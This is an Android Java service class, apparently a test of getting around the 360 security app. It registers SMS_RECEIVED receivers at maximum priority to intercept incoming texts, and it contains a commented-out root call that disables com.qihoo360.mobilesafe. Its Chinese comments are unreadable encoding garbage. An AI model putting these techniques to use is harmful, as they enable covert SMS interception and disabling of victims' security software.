package com.feicong.Test360;

import android.app.Service;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.IBinder;
import android.util.Log;

public class Test360Service extends Service { 

    private static final String TAG = "Test360"; 

    @Override 
    public IBinder onBind(Intent intent) { 
            Log.i(TAG, "onBind"); 
            return null; 
    }

    @Override 
    public void onCreate() { 
            Log.i(TAG, "onCreate"); 
            //RootUtils.EnableApp("com.qihoo360.mobilesafe", false); //����360���������
            IntentFilter localIntentFilter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
            localIntentFilter.setPriority(2147483647);
            MmsReceiver receiver = new MmsReceiver();
            registerReceiver(receiver, localIntentFilter);  //��̬����һ�����ȼ���ߵĶ��Ź㲥������
            
            IntentFilter localIntentFilter2 = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
            localIntentFilter2.setPriority(2147483647);
            ShutdownReceiver receiver2 = new ShutdownReceiver();
            registerReceiver(receiver2, localIntentFilter2);  //��̬����һ���ػ��㲥������
            
            super.onCreate(); 
    }

    @Override 
    public void onDestroy() { 
            Log.i(TAG, "onDestroy"); 
            super.onDestroy(); 
    } 

    @Override 
    public void onStart(Intent intent, int startId) { 
            Log.i(TAG, "onStart"); 
            super.onStart(intent, startId); 
    } 
}
